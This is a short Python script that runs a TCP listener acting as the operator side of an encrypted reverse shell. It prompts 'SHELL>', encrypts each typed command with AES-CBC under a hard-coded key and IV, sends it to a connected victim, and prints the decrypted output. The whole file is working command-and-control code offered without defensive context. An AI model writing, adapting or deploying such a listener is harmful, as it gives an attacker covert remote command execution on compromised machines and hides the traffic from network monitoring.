#!/usr/bin/env python3
import socketserver
from Crypto.Cipher import AES
import sys

KEY = b'm6kOQIGDSy8Q1NOjzvzFXmBg7nPLMccn'
IV = b'PEXjL8hqty0OlOV5'

def pad(data):
    if len(data) % 16 != 0:
        data += b'\x00' * (16 - (len(data) % 16))
    return data

def encrypt(data):
    ctx = AES.new(KEY, AES.MODE_CBC, IV)
    return ctx.encrypt(pad(data))

def decrypt(data):
    ctx = AES.new(KEY, AES.MODE_CBC, IV)
    return ctx.decrypt(pad(data))

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):

        while True:
            cmd = input("SHELL> ")
            buffer = encrypt(cmd.encode())
            self.request.sendall(buffer)
            buffer = decrypt(self.request.recv(4096))
            print(buffer)
            
if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", int(sys.argv[1], 10)

    # Create the server, binding to localhost on port 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        server.serve_forever()